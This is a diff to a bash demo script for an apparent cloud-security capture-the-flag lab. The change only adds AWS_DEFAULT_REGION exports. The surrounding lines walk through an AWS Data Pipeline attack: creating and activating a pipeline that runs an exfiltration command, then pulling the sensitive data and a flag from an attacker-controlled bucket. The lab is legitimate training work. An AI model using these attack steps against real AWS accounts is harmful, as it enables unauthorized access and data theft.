@@ -150,6 +150,7 @@ setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
 echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 echo "Using region: $AWS_REGION"
 
@@ -167,6 +168,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
@@ -176,6 +178,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 echo -e "${YELLOW}Step 4: Verifying we don't have direct access to sensitive bucket${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Attempting to read sensitive data directly (should fail)..."
 show_cmd "Attacker" "aws s3 cp s3://$SENSITIVE_BUCKET/secret-data.txt -"
 if aws s3 cp s3://$SENSITIVE_BUCKET/secret-data.txt - 2>/dev/null; then
@@ -204,6 +207,7 @@ echo ""
 echo -e "${YELLOW}Step 6: Creating Data Pipeline${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Pipeline name: $PIPELINE_NAME"
 
 show_attack_cmd "Attacker" "aws datapipeline create-pipeline --region $AWS_REGION --name \"$PIPELINE_NAME\" --unique-id \"datapipeline-\$(date +%s)\" --query 'pipelineId' --output text"
@@ -269,6 +273,7 @@ echo -e "${GREEN}✓ Pipeline definition created${NC}\n"
 echo -e "${YELLOW}Step 8: Uploading pipeline definition${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 show_attack_cmd "Attacker" "aws datapipeline put-pipeline-definition --region $AWS_REGION --pipeline-id \"$PIPELINE_ID\" --pipeline-definition file:///tmp/pipeline_definition.json --output json"
 aws datapipeline put-pipeline-definition \
@@ -294,6 +299,7 @@ echo -e "${GREEN}✓ Pipeline definition uploaded successfully${NC}\n"
 echo -e "${YELLOW}Step 9: Activating the pipeline${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "This will launch an EC2 instance and execute the exfiltration command..."
 
 show_attack_cmd "Attacker" "aws datapipeline activate-pipeline --region $AWS_REGION --pipeline-id \"$PIPELINE_ID\" --output json"
@@ -328,6 +334,7 @@ echo -e "${GREEN}✓ Wait complete${NC}\n"
 echo -e "${YELLOW}Step 11: Verifying exfiltration was successful${NC}"
 use_attacker_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Checking attacker-controlled exfil bucket for the exfiltrated file..."
 
 # First check if the file exists
@@ -349,6 +356,7 @@ fi
 echo -e "${YELLOW}Step 12: Reading the exfiltrated sensitive data${NC}"
 use_attacker_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Retrieving the exfiltrated file from attacker-controlled bucket: s3://$EXFIL_BUCKET/exfiltrated.txt"
 echo ""
 
@@ -371,6 +379,7 @@ echo ""
 echo -e "${YELLOW}Step 13: Capturing CTF flag from exfil bucket${NC}"
 use_attacker_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Retrieving flag.txt from attacker-controlled exfil bucket..."
 echo ""
 
